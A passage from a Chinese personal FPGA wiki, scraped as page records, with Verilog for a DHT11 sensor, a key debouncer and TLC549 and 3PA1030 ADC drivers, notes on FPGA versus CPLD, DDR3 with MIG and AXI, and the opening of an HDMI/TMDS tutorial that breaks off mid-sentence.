1&#x27;d1 &amp;&amp; cnt_us &gt;50) data_temp[39-bit_cnt] &lt;= 1&#x27;d1; else data_temp &lt;= data_temp; end //数据校验和赋值 always@(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) data &lt;= 32&#x27;d0; else if(data_temp[7:0] == data_temp[39:32] + data_temp[31:24] + data_temp[23:16] + data_temp[15:8]) data &lt;= data_temp[39:8]; else data &lt;= data; end // dht11_en 的赋值 always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) dht11_en &lt;= 1&#x27;d0; else if(state == S_LOW_18MS) dht11_en &lt;= 1&#x27;d1; else dht11_en &lt;= 1&#x27;d0; end // dht11_out 的赋值 assign dht11_out = 1&#x27;d0 ; // data_flag 的赋值 always @(posedge sys_clk or negedge sys_rst_n) begin if(!sys_rst_n) data_flag &lt;= 1&#x27;d0; else if(key_flag == 1&#x27;d0) data_flag &lt;= ~data_flag; else data_flag &lt;= data_flag; end // 输出信号 always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) data_out &lt;= 20&#x27;d0; else if(data_flag == 1&#x27;d0) data_out &lt;= data[31:24]*10; else if(data_flag == 1&#x27;d1) data_out &lt;= (data[15:8]*10) + data[3:0]; end // 符号位 always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) sign &lt;= 1&#x27;d0; else if(data_flag == 1&#x27;d1 &amp;&amp; data[7] == 1&#x27;d1) sign &lt;= 1&#x27;d1; else sign &lt;= 1&#x27;d0; end // 如果使能是高电平，则吧dht11_out赋值给dht11输出端口。否则dht11端口作为输入端口为高阻态状态 assign dht11 = (dht11_en == 1&#x27;d1) ? dht11_out : 1&#x27;bz; endmodule 按键消抖模块 key_filter.vmodule key_filter #( parameter CNT_MAX = 32&#x27;d99999 ) ( input wire sys_clk , input wire sys_rst_n , input wire key_in , output reg key_flag , output reg led_out ); reg [31:0] cnt_20ms; always @(posedge sys_clk or negedge sys_rst_n) if(!sys_rst_n) cnt_20ms&lt;=20&#x27;d0; else if(key_in == 1&#x27;b1) cnt_20ms&lt;=20&#x27;d0; else if(cnt_20ms == CNT_MAX) cnt_20ms&lt;=CNT_MAX; else cnt_20ms&lt;=cnt_20ms+20&#x27;d1; always @(posedge sys_clk or negedge sys_rst_n) begin if(!sys_rst_n) key_flag&lt;=1&#x27;b0; else if(cnt_20ms == (CNT_MAX-20&#x27;d1)) key_flag&lt;=1&#x27;b1; else key_flag&lt;=1&#x27;b0; end always @(*) begin if(!sys_rst_n) led_out&lt;=1&#x27;b0; else if(cnt_20ms == CNT_MAX) led_out&lt;=1&#x27;b0; else led_out&lt;=1&#x27;b1; end endmodule 引脚配置引脚配置 参考链接[1] ChatGPT3.5 [2] 128-第三十九讲-DHT11数字温湿度传感器（一）_哔哩哔哩_bilibili"},{"title":"AD外设的原理","path":"/wiki/FPGA/AD外设的原理.html","content":"1. 简介及前言1.1 简介我们主要来介绍AD（Analog to digital）外设，中文名叫做模拟转数字，主要用于实现从物理的连续模拟信号转变为在芯片中传输的离散数字信号，例如实现一个示波器的、信号采集器等都至关重要。 因为我们知道，对于任意一个波形或者任意一个物理世界中存在的信号来说，它都不是一个数字信号而是一个实实在在的模拟信号。而模拟信号通过AD芯片可以量化成我们的数字信号 将模拟信号转变为数字信号的电子元件或者电路，将经过与标准量比较处理后的模拟量转换为以二进制数值表示的离散信号。模拟信号向数字信号转换过程一般分为四个步骤：采样、保持、量化、编码。采样与保持，一般是在电路中弯沉，而量化和编码则需要我们这里的AD芯片 常用的AD芯片的种类及结构有很多中类型：逐次逼近型、流水线型、闪速、积分型、压频、智能等转换器 AD的外围电路也与很多：信号调理电路、电压基准电路等 关于很多原理，就需要参考书籍进行学习，例如这里参考的就是《常用A&#x2F;D、D&#x2F;A器件手册》，是我在实验室的书架中看到的一本书 1.2 前言不同的产品尽管在性能指标及体系结构上与差异，但市场上绝大多数的器件都是针对通用领域来设计的，从用户的角度上来讲，不仅价格昂贵，而且很难做选择。 按照领域细分：随着工业制造工艺的进步，使得为专门应用设计的器件成为可能。最明显的领域如多媒体数字信号编解码器（CODEC），这一设计针对音频领域专门涉及到高性能数据转换器件。采用$I^2S$接口传输音频数据，采用$I^2C总线作为控制总线等。 高速度：这种趋势在两个领域应用中十分明显：一个是软件无线电，另一个是示波器及信号分析设备。所谓软件无线电，就是采用数字信号处理的技术，在可编程控制的通用硬件平台上，利用软件来定义实现无线电台的各部分功能，包括：前端接收、中频处理以及信号的基带处理等。 高精度：Σ-Δ型ADC（也称为过采样转换器）是一种高精度的转换器，它采用增量编码方式进行量化编码，最高分辨率达到24位，通过模拟Σ-Δ调制器和数字抽取滤波器来实现高分辨率的数字信号转换。此外，流水线型ADC也是一种高效且强大的模数转换器，它能够提供高速、高分辨率的模数转换，并且具有低功率消耗和较小的芯片尺寸。 SoC技术的应用及智能转换器：片上系统（SoC）已经称为继承电路发展的去世。大部分传感器需要进行信号调整以消除潜在的测量误差。这些误差包括增益和偏移误差、环境或固有噪声以及传感器自身传递函数的非线性。这些要求使得A&#x2F;D转换器本身要做的事情不仅是从模拟信号到数字信号的转换，可能还需要完成信号调理、补偿、误差修正、数据格式转换、提供激励源或偏置，甚至在片上系统上集成一个控制器。从用户的角度来看，它们是带有A&#x2F;D转换器及D&#x2F;A转换器的处理器。从数据的角度来看，它们是基于SoC技术的集成了处理器的A&#x2F;D转换器，可以把他们称为“智能A&#x2F;D转换器” 2. AD的基本概述从AD的名字可以看出，AD就是将时间连续、幅值也连续的模拟量转换成时间离散、幅值也离散的数字信号。 3. AD的通信协议TLC549内部具有4MHZ的系统时钟，并且该时钟域I&#x2F;O CLOCK是独立工作的，所以我们无需特殊的速度或相位匹配就可以进行时序的操作 3.1 AD时序图AD时序图 在这里我们需要注意几个问题： 当CS为高时，转换结果输出串行输出端DATA OUT处于高阻状态，此时I&#x2F;O CLOCK不起作用 当CS为低时，AD前一次转换数据A的最高位A7立即出现在数据线DATA OUT上，其余的7位数据在I&#x2F;O CLOCK的下降沿一次由时钟同步输出。因此可在I&#x2F;O CLOCK的上升沿读取数据。 当CS变为低电平到I&#x2F;O CLOCK的第一个时钟到来至少需要1.4us。 I&#x2F;O CLOCK不能超过1.1MHZ。 读完8位数据，AD开始转换这次的采样数据，以便下一次读取。转换时片选信号CS必须置高电平，每次转换时间不超过17us，开始于CS变为低电平后I&#x2F;O CLOSK的第8个下降沿，没有转换完成标志信号；也没有启动控制端，只要读取前一次数据后马上开始新的AD转换，转换完成之后进入保持状态。 4. TLC549_AD串行芯片的实战它以8位开关电容逐次逼近型[^1]的方法实现AD转换，其内部具有4MHZ的系统时钟，转换速度小于17us，它允许的最大转换速率为40_000次&#x2F;s，电源为3V-6V，能方便地采用三线串行接口方式与各种微处理器进行链连接 4.1 引脚含义如下：TLC549引脚图 **REF+**：正基准电压输入 2.5V≤REF+≤Vcc+0.1。 REF－：负基准电压输入端，-0.1V≤REF-≤2.5V。且要求：（REF+）－（REF-）≥1V。 VCC：系统电源3V≤Vcc≤6V。 GND：接地端。 &#x2F;CS：芯片选择输入端，要求输入高电平 VIN≥2V，输入低电平 VIN≤0.8V。 DATA OUT：转换结果数据串行输出端，与 TTL 电平兼容，输出时高位在前，低位在后。 ANALOGIN：模拟信号输入端，0≤ANALOGIN≤Vcc，当 ANALOGIN≥REF+电压时，转换结果为全“1”(0FFH)，ANALOGIN≤REF-电压时，转换结果为全“0”(00H)。 I&#x2F;O CLOCK：外接输入&#x2F;输出时钟输入端，同于同步芯片的输入输出操作，无需与芯片内部系统时钟同步。 4.2 芯片连接原理芯片连接原理图 芯片手册及实验解析文档链接如下： https://zikwq.lanzout.com/b00rn1bf8h密码:9q6b 4.3 逐次逼近型原理20240511154725 4.4量化电平20240511154825 4.5 代码模块TCL框图 框图针对FPGA设计，其中data为AD的输出数据，也就是FPGA的输入端 TCL549.vmodule TLC549( clk, //系统输入时钟 ioclk,//AD驱动时钟 data, //TLC549的数据串行输出端，相对于FPGA为输入 cs, //AD片选信号 rst_n,//系统复位 segdata,//数码管段选 segcs//数码管位选 ); input clk; input data; input rst_n; output reg cs; output reg ioclk; output reg [7:0]segdata; output reg [2:0]segcs; reg[31:0] count; reg[24:0]count1ms; reg[3:0] cnt; reg[2:0]number; reg[1:0] state; reg[7:0]dataout; reg[15:0]tenvalue; reg clk1ms; parameter sample=2&#x27;b00, display=2&#x27;b01; //-----------数据采集时钟----------- always@(posedge clk) begin if(count&lt;16&#x27;d1000) count&lt;=count+1&#x27;b1; else begin count&lt;=0; ioclk&lt;=~ioclk; end end //-----------数码管驱动时钟----------- always@(posedge clk) begin if(count1ms&gt;25&#x27;d1000_0) begin clk1ms&lt;=~clk1ms; count1ms&lt;=0; end else count1ms&lt;=count1ms+1; end //-----------AD数据采集----------- always@(negedge ioclk) begin case(state) sample: begin cs&lt;=0; dataout[7:0]&lt;=&#123;dataout[6:0],data&#125;; if(cnt&gt;4&#x27;d7) begin cnt&lt;=0; state&lt;=display; end else begin cnt&lt;=cnt+1; state&lt;=sample; end end display: begin cs&lt;=1; tenvalue&lt;=(dataout * 1000 * 25 )/256; state&lt;=sample; end default: state&lt;=display; endcase end //-----------数码管译码----------- function[7:0] leddata; input[3:0] datain; begin case(datain) 4&#x27;d0: leddata=8&#x27;b11000000;//0 4&#x27;d1: leddata=8&#x27;b11111001;//1 4&#x27;d2: leddata=8&#x27;b10100100;//2 4&#x27;d3: leddata=8&#x27;b10110000;//3 4&#x27;d4: leddata=8&#x27;b10011001;//4 4&#x27;d5: leddata=8&#x27;b10010010;//5 4&#x27;d6: leddata=8&#x27;b10000010;//6 4&#x27;d7: leddata=8&#x27;b11111000;//7 4&#x27;d8: leddata=8&#x27;b10000000;//8 4&#x27;d9: leddata=8&#x27;b10010000;//9 4&#x27;d10: leddata=8&#x27;b10111111;//- 4&#x27;d11: leddata=8&#x27;b01111111;//. default:leddata=8&#x27;bzzzz_zzzz; endcase end endfunction //-----------数码管扫描----------- always@(posedge clk1ms) begin if(number==4) number&lt;=0; else begin number&lt;=number+1; case(number) 4&#x27;d0: begin segdata&lt;=leddata((tenvalue/10)%10);//个位 segcs&lt;=3&#x27;b011; end 4&#x27;d1: begin segdata&lt;=leddata((tenvalue/100)%10);//十位 segcs&lt;=3&#x27;b010; end 4&#x27;d2: begin segdata&lt;=leddata((tenvalue/1000)%10); //百位 segcs&lt;=3&#x27;b001; end 4&#x27;d3: begin segdata&lt;=leddata(tenvalue/10000);//千位 segcs&lt;=3&#x27;b000; end endcase end end endmodule 5. 3PA1030双路高速AD并行芯片的实战参考野火FPGA第24_dig_volt教程资料 adc.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/08/10 // Module Name : adc // Project Name : dig_volt // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 电压计算模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module adc ( input wire sys_clk , //时钟 input wire sys_rst_n , //复位信号，低电平有效 input wire [7:0] ad_data , //AD输入数据 output wire ad_clk , //AD驱动时钟,最大支持20Mhz时钟 output wire sign , //正负符号位 output wire [15:0] volt //数据转换后的电压值 ); //********************************************************************// //******************Parameter And Internal Signal ********************// //********************************************************************// //parameter define parameter CNT_DATA_MAX = 11&#x27;d1024; //数据累加次数 //wire define wire [27:0] data_p ; //根据中值计算出的正向电压AD分辨率 wire [27:0] data_n ; //根据中值计算出的负向电压AD分辨率 //reg define reg median_en ; //中值使能 reg [10:0] cnt_median ; //中值数据累加计数器 reg [18:0] data_sum_m ; //1024次中值数据累加总和 reg [7:0] data_median ; //中值数据 reg [1:0] cnt_sys_clk ; //时钟分频计数器 reg clk_sample ; //采样数据时钟 reg [27:0] volt_reg ; //电压值寄存 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //数据ad_data是在ad_sys_clk的上升沿更新 //所以在ad_sys_clk的下降沿采集数据是数据稳定的时刻 //FPGA内部一般使用上升沿锁存数据,所以时钟取反 //这样ad_sys_clk的下降沿相当于sample_sys_clk的上升沿 assign ad_clk = ~clk_sample; //sign:正负符号位 assign sign = (ad_data &lt; data_median) ? 1&#x27;b1 : 1&#x27;b0; //时钟分频(4分频,时钟频率为12.5Mhz),产生采样AD数据时钟 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin cnt_sys_clk &lt;= 2&#x27;d0; clk_sample &lt;= 1&#x27;b0; end else begin cnt_sys_clk &lt;= cnt_sys_clk + 2&#x27;d1; if(cnt_sys_clk == 2&#x27;d1) begin cnt_sys_clk &lt;= 2&#x27;d0; clk_sample &lt;= ~clk_sample; end end //中值使能信号 always@(posedge clk_sample or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) median_en &lt;= 1&#x27;b0; else if(cnt_median == CNT_DATA_MAX) median_en &lt;= 1&#x27;b1; else median_en &lt;= median_en; //cnt_median:中值数据累加计数器 always@(posedge clk_sample or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_median &lt;= 11&#x27;d0; else if(median_en == 1&#x27;b0) cnt_median &lt;= cnt_median + 1&#x27;b1; //data_sum_m:1024次中值数据累加总和 always@(posedge clk_sample or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) data_sum_m &lt;= 19&#x27;d0; else if(cnt_median == CNT_DATA_MAX) data_sum_m &lt;= 19&#x27;d0; else data_sum_m &lt;= data_sum_m + ad_data; //data_median:中值数据 always@(posedge clk_sample or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) data_median &lt;= 8&#x27;d0; else if(cnt_median == CNT_DATA_MAX) data_median &lt;= data_sum_m / CNT_DATA_MAX; else data_median &lt;= data_median; //data_p:根据中值计算出的正向电压AD分辨率(放大2^13*1000倍) //data_n:根据中值计算出的负向电压AD分辨率(放大2^13*1000倍) assign data_p = (median_en == 1&#x27;b1) ? 8192_0000 / ((255 - data_median) * 2) : 0; assign data_n = (median_en == 1&#x27;b1) ? 8192_0000 / ((data_median + 1) * 2) : 0; //volt_reg:处理后的稳定数据 always@(posedge clk_sample or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) volt_reg &lt;= &#x27;d0; else if(median_en == 1&#x27;b1) if((ad_data &gt; (data_median - 3))&amp;&amp;(ad_data &lt; (data_median + 3))) volt_reg &lt;= &#x27;d0; else if(ad_data &lt; data_median) volt_reg &lt;= (data_n *(data_median - ad_data)) &gt;&gt; 13; else if(ad_data &gt; data_median) volt_reg &lt;= (data_p *(ad_data - data_median)) &gt;&gt; 13; else volt_reg &lt;= &#x27;d0; //volt:数据转换后的电压值 assign volt = volt_reg; endmodule 6. 常见的其他AD芯片知识汇总参考资料 [1]. 书籍：常用A&#x2F;D、D&#x2F;A器件手册-张志刚主编-电子工业出版社出版 [2]. https://zhuanlan.zhihu.com/p/682927018"},{"title":"FPGA与CPLD的区别与联系","path":"/wiki/FPGA/FPGA与CPLD的区别与联系.html","content":"项目 FPGA CPLD 备注 结构工艺 多位LUT加寄存器结构，实现工艺多为SRAM，也包含Flash、Anti-Fuse等工艺 多位乘积项，工艺多为E2CMOS，也包含EEPROM、Flash、Anti-Fuse 触发器数量 多 少 FPGA更适合实现时序逻辑，CPLD多用于实现组合逻辑 Pin to Pin 延时 不可预测 固定 对FPGA而言，时序约束和仿真十分重要 规模与逻辑复杂度 规模大，逻辑复杂度高，新型器件高达千万门级 过莫笑，逻辑复杂度低 FPGA用以实现复杂设计，CPLD用以实现简单设计 成本与价格 成本高、价格贵 成本低，价格低 CPLD用来实现低成本设计 编程与配置 一般包含两种，外挂BootRom和通过CPU或DSP等在线编程。多数基本属于RAM型，掉电后程序丢失 有两种编程方式，一种是通过编程器烧写ROM，另一种较方便的方法是通过ISP模式。一般为ROM型，掉电后程序不会丢失 FPGA掉电后会丢失原有逻辑配置。而反熔丝工艺的FPGA，如Actel的某些器件族和目前的一些内嵌Flash或EECMOS的FPGA，如Lattice的XP器件族，可以实现非易失配置方式 保密性 一般保密性较差 好 一般FPGA不容易实现加密，但是目前一些采用Flash加SRAM工艺的新型器件（如Lattice XP系列），在内部嵌入了加载Flash，能够提供更高的保密性 互联结构、连线资源 分布式，丰富的布线资源 集总式，相对布线资源有限 FPGA布线灵活，但是时序更难规划，一般通过时序约束，静态时序分析，时序仿真等手段提高并验证时序性能 适用的设计类型 复杂的时序功能 简单的逻辑功能 CPLD的产品图 参考资料 Altrea FPGA&#x2F;CPLD设计（基础篇）-EDA先锋工作室-王诚编著 Xilinx CPLD教程，Verilog入门：点亮LED灯_xilinx cpld 配置引脚-CSDN博客"},{"title":"DDR3读写控制器的设计与验证","path":"/wiki/FPGA/DDR3读写控制器的设计与验证.html","content":"DDR的迭代图 1. 上板验证 ··· 关于上板，需要搁置一段落，我看的野火教程并没有更新到上板验证的部分，所以需要去观看其他相关的实操视频来填坑~~ 2. 理论学习2.1 DDR3 SDRAM的基本概念 DDR3内存条就像一本由多个页面组成的书。在这本书中，每一页都代表内存中的一个逻辑单元，也就是一个bank。每个bank是内存的一个独立部分，可以独立地进行数据的读写操作。 在每一页（bank）中，数据被组织成行和列，类似于表格。通过行地址和列地址，我们可以定位到这个表格中的一个特定单元格，这个单元格就是内存中的基本逻辑单元。这个单元格可以存储一个字（word），其大小由DDR3内存条的位宽决定。例如，如果内存条的位宽是64位，那么这个字就可以存储64位二进制数据。 位宽是内存条的一个重要参数，它决定了内存一次能够传输的数据量。位宽越大，单次传输的数据量就越多，从而提高内存的带宽和性能。 内存的总容量是由所有bank的容量总和决定的。每个bank的容量乘以bank的数量，再乘以每个存储单元的位数，就得到了整个内存条的总容量。因此，内存条的容量可以通过增加bank的数量或增加每个bank的容量来提升。 DDR3 SDRAM英文全称“Double-Data-Rate- Three Synchronous Dynamic Random Access Memory”，翻译成中文为“第三代双倍速率同步动态随机存取内存”或“同步动态随机存储器”，是动态随机存储器（简称：DRAM）家族的一份子。 关键词：双倍率、同步、动态、随机 双倍速率：它可以在时钟的上升沿和下降沿都可以传输一个数据 同步：通常DRAM是异步的，而DDR3是同步的，所谓的同步，就是说它的一个数据在读取的时候 或者说是在写入的时候是按时钟同步的 动态：DDR3是一个数据存储器，它是使用电容对数据进行一个存储，主要是因为电容一个特性可以存储电荷。但是电容存储的电荷会慢慢的进行一个释放，这个时候就会造成数据的一个不确定性，可能读取的数据时错的，这个时候，我们的DDR3就会进行一个不断地刷新，也就是不断地给他进行充电，来保证这个存储阵列内部的数据可靠性 随机：数据在DDR3当中，并不是按照线性依次存储的，而是自由的指定地址进行数据的读写。只要给它一个地址，它就可以根据这个地址找到具体的一个存储单元，然后就可以对这个地址进行数据的一个读写操作 除此之外，它的可见存储量也非常大、读取数据快以及价格相对便宜的特点 当然，它也有缺点， 因为是动态，那么我们就要不断的对它进行充电和放电 因为数据读取时是随机读取的，需要地址，它的行和列地址是共用了一个地址端口，使用了一个分时复用的方式 这两个缺点就使得DDR3，对操作时序的要求比较严格，进而导致控制逻辑十分复杂。但是例如Xilinx提供了DDR的IP核可以进行调用 2.2 DDR3 SDRAM数据存取原理存储阵列 简单来说，DDR3内部可以理解为一个存储阵列，这就是DDR区别于管道式存储实现随机地址存储的一个结构特点。上图中。每一个表格相当于一个存储单元，存储阵列也叫做逻辑Bank也可以叫做L-Bank，一个DDR3一般有8个Bank，这些Bank就构成了整体的一个存储空间。如果要想实现在DDR3中某一个存储单元进行一个读写数据操作，我们首先需要确定它的一个Bank地址，然后通过一个行地址和一个列地址（满足一个先行后列的要求） DDR3的存储：Bank –&gt; RC(行列) –&gt; 存储单元 总存储容量（Bit）&#x3D; bank数量 X 行数量 X 列数量 X 存储单元容量 一个存储单元又可以划分为若干个比特（根据DDR3的位宽来决定），如果说我们的DDR3是16位的，那么一个存储单元中就可以存储16个比特数据、每一个比特是存储在单独的存储体当中，存储体是利用电容能够保持电荷以及充放点的一个特性制成的 DDR3数据手册下载地址 MT41K128M16JT：https://cdn.jsdelivr.net/gh/zikwq/Blog_Pic/MT41K128M16JT.pdf 4Gb_DDR3L：https://cdn.jsdelivr.net/gh/zikwq/Blog_Pic/4Gb_DDR3L.pdf 2.3 DDR3 SDRAM器件引脚说明注意，此处引脚说明并非实例化时所使用的引脚，而是器件的x16 Ball Descriptions引脚说明，是总DataSheet中翻译过来的。**** 引脚 位宽 端口类型 功能描述 CLK,CLK# 2Bit Input 差分时钟：DDR3 SDRAM由差分时钟驱动，所有DDR3 SDRAM输入信号都在时钟上升沿和下降采同时CLK还递增内部突发计数器并控制输出寄存器。 RESET# 1Bit Input 芯片复位信号，低电平有效 CKE 1Bit Input 时钟使能：屏藏时钟，冻结当前操作，高电平有效，信号有效时，所有信号才能被正确送入DDR3 SDRAM. CS#(CS_N) 1Bit Input 片选信号：屏蔽和使能所有输入输出端口，CLK、CKE、DQV除外，低电平有效。为高电平时，屏蔽所有命令，但已经突发的读&#x2F;写操作不受影响。 CAS#(ACS_N) 1Bit Input 列选通信号：低电平有效，为低电平时，A[9:0]输入的为列地址 RAS#(RCS_N) 1Bit Input 行选通信号：低电平有效，为低电平时，A[13:0]输入的为行地址 WES#(WE N) 1Bit Input 写使能信号，低电平有效，为低电平时，使能写操作和预充电。(CS#、CAS#、RAS#、WE#)构成DDR3 SDRAM操作命令。 LDM,UDM 1Bit Input 数据掩码：LDM低字节掩码，UDM高字节掩码，若LDM信号为高电平，在下一个时钟周期的时钟上升沿，输出数据总线的低字节为高阻态。UDM则相反。 ODT 1Bit Input 片上终端使能，若为高电平，可以消除DQ、DQS、DW信号的反射。 BA[2:0] 1Bit Input L-Bank地址：选择不同的逻辑Bank进行相关数 A[14:0] 15Bit Input 行列地址总线：提供模式寄存器配置期问的操作码。 DQ[15:0] 16Bit Inout 数据总线 这里只列出来一部分端口，需要完整的内容可以去上面的芯片手册中获取更加完整的内容！ 2.4 DDR3 时钟分析 系统时钟：MIG IP核的工作时钟，一般命名为sys_clk 参考时钟： MIG IP的参考时钟，必须为200MHZ，命名位ref_clk DDR3芯片的工作时钟：由FPGA输入到DDR3芯片，为差分时钟 用户端时钟：MIG IP核输出给用户端的时钟，命名为ui_clk 在DDR3芯片工作的时钟与用户端时钟有一个比例关系： DDR3芯片的工作频率：用户端时钟频率为4:1或者2:1，当DDR3芯片的工作时钟为800MHZ的时候，比例只能是2:1。 2.5 DDR3的模块实验用户端接口与两种：Native接口和AXI4接口，接下来我们使用AXI4接口进行实验 实验目标：我们通过MIG IP核对DDR3写入1024个数据，然后进行读取出来的实验，并使用ila在线逻辑分析仪，对数据进行抓取 从我们的原理图中可以看到，我们在PL端使用的ddr3型号是MT41K256M16RE-125。 通过前面的讲解介绍，DDR3的存储容量4Gb的存储容量。图中可以看出来，我们PL端是并联了2片DDR3，PL 端 2 片内存组成 32bit 数据接口，也就是4Gb的存储容量&#x3D;1GB内存大小 ， 2.5.1 模块框图绘制 在上面的框图中，我们的axi_ddr_top还需要实例化四个模块，分别是：读写控制模块、读模块、写模块、还有MIG IP核。下面进行我们mig ip核的配置 2.5.2 MIG DDR IP核配置 点击后在右边搜索栏目搜索“MIG”，直接双击打开，这里显示的是我们fpga 工程的相关信息，点击下一步 基本信息的配置 引脚信息 这里是是否兼容其他的芯片选项，我们这里就不用管 控制器的选择 控制器的基本配置 关于这边的时钟，如果我们是K7的板子，DDR3工作时钟是可以达到800MHZ的,下面的 用户端时钟只能必须为200MHZ，如果是A7 的板子，他的工作时钟通常为最高为600MHZ AXI总线的配置 内存设置–对应的阻抗可以在数据手册中搜索：“output drive strength” FPGA选项 引脚选择 到这里都已经完成了，后面就是正常默认完成就行 2.5.3 声明两个FIFO IP核 打开我们的ip核目录，在搜索框里面搜索FIFO 配置基本信息 配置常规接口 配置标志信号 配置数据计数器 下面是读FIFO的配置，跟写FIFO类似只有下面一张图的配置跟写FIFO不一样 2.5.4 PLL锁相环IP核配置 打开目标锁相环 配置输入输出时钟，这里我们输入是100MHZ，输出320MHZ的DDR3工作时钟 2.5.6 RTL视图 2.5.7 仿真MIG IP核2.5.8 上板验证——ILA仿真在我们需要抓取的信号前面加上 (*mark_debug=&quot;true&quot;*) 3. Native接口概述 4. AXI接口概述AXI总线你需要知道的事儿 - 知乎 (zhihu.com) AXI的英文全称“Advancede Xtensible Interface” ,即为高级可扩展接口，他是ARM公司所提出的AMBA协议（高级微控制器总线框架协议，包含了四种不同的总线标准：AHB、ASB、APB、AXI）的一部分 之所以要采用AXI4接口对DDR进行读写是因为Xilinx的MIG DDR IP核，无论是6系列还是7系列还是最新的FPGA，都集成了AXI4接口，采用AXI4接口进行读写，后续可以兼容Xilinx的其他FPGA，可复用性更强。 2.5.1 AXI接口的特点AXI协议是一种高性能、高宽带、低延时的片内总线，有如下特点： 总线地址&#x2F;控制和数据通道是分离的；它可以分为五个不同的通道：写地址通道、写数据通道、写响应通道、读地址通道、读数据通道 支持不对其的传输； 支持突发传输，突发传输过程中只需要首地址；突发长度Burst Length一般为8 具有分离的读写数据通道； 支持显著传输访问和乱序访问； 更容易进行时序收敛； 2.5.2 AXI接口分类AXI4协议支持有三种类型的接口，分别是： AXI4：高性能的存储映射接口 AXI4_Lite：用于数据量少的存储映射通信 AXI4_Stream：高数据流的一个传输，非存储映射接口。就像一个FIFO一样，不需要地址，直接连续的一个读写数据，主要用于视频、高速的一个AD、PCIE、DMA接口等需要高速数据传输的一个场合 2.5.3 什么是存储映射【嵌入式系统】存储器映射与寄存器映射原理-CSDN博客 当一个协议是存储映射的时候，主机对从机进行读写操作的时候，会标明一个地址，这个地址就对应系统存储空间当中的一个地址，就表示针对该存储空间进行一次读写操作。 主要用于处理器访问处理器等，需要指定地址的一个高速数据传输的一个场景。 存储器映射是硬件抽象的一种形式，它允许软件通过统一的内存模型来与硬件设备交互，这在现代计算机系统中非常常见。在AXI4协议中，存储映射的概念被用来实现高效的系统内通信，允许不同的处理器和外设通过共享的地址空间进行数据交换和控制。除了存储映射外，还有寄存器映射，详情请参考上面这篇参考博客。 2.5.4 AXI时序AXI时序数据手册下载地址： AXI4_Interconnect&#x2F;Document&#x2F;IHI0022E_amba_axi_and_ace_protocol_spec.pdf at master · Verdvana&#x2F;AXI4_Interconnect (github.com) 参考资料【嵌入式系统】存储器映射与寄存器映射原理-CSDN博客 AXI总线你需要知道的事儿 - 知乎 (zhihu.com) 119-第三十七讲-DDR3读写控制器的设计与验证 时钟分析_哔哩哔哩_bilibili"},{"title":"FPGA实现CAN通信","path":"/wiki/FPGA/FPGA实现CAN通信.html","content":"https://www.parlezvoustech.com/bus-can-2024-technologie-avantages-evolutions/"},{"title":"ROM、RAM、FIFO知识点整理、区分、应用案例","path":"/wiki/FPGA/ROM、RAM、FIFO知识点整理、区分、应用案例.html","content":"开发中···ROM、RAM、FIFO知识点整理、区分、应用案例.md"},{"title":"HDMI显示器驱动设计","path":"/wiki/FPGA/HDMI显示器驱动设计.html","content":"效果演示 理论学习在前面我们学习了使用VGA接口实现等宽彩条和RGB232图片显示的验证设计，VGA传输的是模拟信号，因此在传输过程中极易受到外界干扰源的影响，传输的信号会产生畸变，就会导致我们传输的图像出现问题。 HDMI–高清多媒体接口，是在2002.12，HDMI1.0问世，整个传输的原理使用TMDS编码技术，可以实现20m的无争议传输。除此之外，HDMI可以在一根线上实现数字信号和音频信号同步传输 1. HDMI引脚HDMI引脚都是使用19Pin的引脚，下面是它的引脚说明，根据它的引脚功能，可以划分为四类：最重要的是四对传输信号（四对差分对） TMDS： Pin（1-12），负责发送音频视频以及各种辅助数据的。遵循DVI接口1.0 DDC通道：Pin（15,16,17），这个通道实际上就是一个I2C接口，DDC时钟线对应SCL，数据线对应SDA。作用是获得发送能力和接收能力。在我们HDMI设计中只需要单向获知接收端的能力 CEC通道：Pin（13,17），这个引脚是复用的引脚，这是一个预留的线路 其他通道：Pin（14,18,19），电源和地以及热插拔检测 2. HDMI显示原理 从图中可以看到，包含四对差分线，包含三个数据通道和一个时钟通道，用来传输视频、音频以及辅助数据。 下面是DDC通道，我们的发送端，可以 通过这个通道读取接收端IIC的模式相关信息 CEC通道是必须预留的通道，可以不使用但是要有 接着就是HEAC通道，可以选择hdmi的以太网和音频返回，缩写就是HEAC，他在连接的设备中提供以太网兼容的一个网络数据和一个TMDS相对方向的音频返回通道。说了这么多，我还是没有理解这到底是有什么用 最后还有一个检测热插拔的通道HPD。 总得来说，要使得HDMI正确显示，其中四对差分信号必不可少，另外我们需要提供RGB图像数据、音频以及控制信号（行场同步信号，使能信号），接着，HDMI将这些信号转化成四对差分信号传输出去，那么是怎么将这些数据转化成差分信号用来传输的呐？这就需要使用到TMDS传输原理了 3. TMDS传输原理 TMDS，英文全称“Transition Minimized Differential Signaling”，译为“最小化传输差分信号”。 TMDS传输原理：这里我们传输的图像数据是并行的24位RGB图像数据，也就是RGB888， 然后将这些数据在行场同步下，以及我们的是能信号和时钟信号一起进行一个编码，然后进行并串转换，然后将这些数据分配到独立的端口发送出去。随后接收端接收到来自发送端发送的串行数据后进行解码和串并转换，接着将数据发送到接收端的控制端，使用我们输入的时钟信号进行同步，最后显示在显示器上面。其实我们只需要实现左边一部分的功能就可以了（实现编码和并串转换），接收端不需要进行考虑 TMDS编码TMDS通道包括 3 个RGB 数据传输通道和 1 个时钟信号传输通道。每一通道都通过编码算法，将 8 位的视频、音频数据转换成最小化传输、直流平衡的 10 位数据，8 位数据经过编码和直流平衡得到 10 位最小化数据，看似增加了冗余位，对传输链路的带宽要求会更高，但事实上，通过这种算法得到的 10 